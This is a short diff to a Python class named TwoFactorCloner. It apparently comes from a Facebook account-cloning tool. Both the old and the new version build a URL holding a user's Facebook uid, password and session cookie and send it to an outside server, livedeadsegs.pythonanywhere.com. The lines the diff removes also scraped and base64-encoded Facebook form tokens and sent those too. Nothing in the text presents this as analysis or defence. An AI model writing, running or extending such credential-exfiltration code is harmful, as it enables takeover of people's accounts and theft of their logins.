@@ -25,15 +25,7 @@ class TwoFactorCloner:
         else:
             pass
         cookies = {"Cookie" : cookie}
-        res = requests.get('https://m.facebook.com/', cookies=cookies).text
-        #print(res)
-        try:
-            fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(res)).group(1)
-            jazoest = re.search('name="jazoest" value="(.*?)"', str(res)).group(1)
-        except:
-            return f"{uid}|{password}|Cookies lol"
-        encoded_fb_dtsg = str(base64.b64encode(fb_dtsg.encode('utf-8')).decode('utf-8'))
-        link = f"https://livedeadsegs.pythonanywhere.com/TWO_FACTOR?uid={uid}&password={password}&cookie={cookie}&jazoest={jazoest}&fb_dtsg={encoded_fb_dtsg}"
+        link = f"https://livedeadsegs.pythonanywhere.com/TWO_FACTOR?uid={uid}&password={password}&cookie={cookie}"
         send_req = requests.get(link).text
         return send_req
 
